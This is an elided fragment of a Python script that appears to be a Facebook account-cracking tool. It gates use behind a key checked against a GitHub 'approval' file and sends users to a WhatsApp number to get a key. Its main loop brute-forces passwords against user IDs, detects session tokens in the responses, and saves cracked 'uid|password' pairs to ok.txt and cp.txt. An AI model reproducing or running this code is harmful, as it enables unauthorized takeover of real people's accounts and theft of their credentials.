...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/jahied/approval.txt/blob/main/approval.txt"])
...
def notice():
	...
	os.system("xdg-open https://wa.me/+8801747951169?app=fbl")
	runtxt("\033[0;97m Your Key >> %s%s"%(G,basesplit))
	runtxt("\033[0;97m Approval Neyar Jonno Whatsapp A key Dao ")
	os.system("xdg-open https://wa.me/+8801747951169?text=")
	subprocess.check_output(["am", "start", "https://wa.me/+8801747951169?text="])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/jahied/approval.txt/blob/main/approval.txt').text
			if basesplit in plr:
				key = basesplit
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=B-H-T=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=B-H-T=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=B-H-T=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=B-H-T=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue
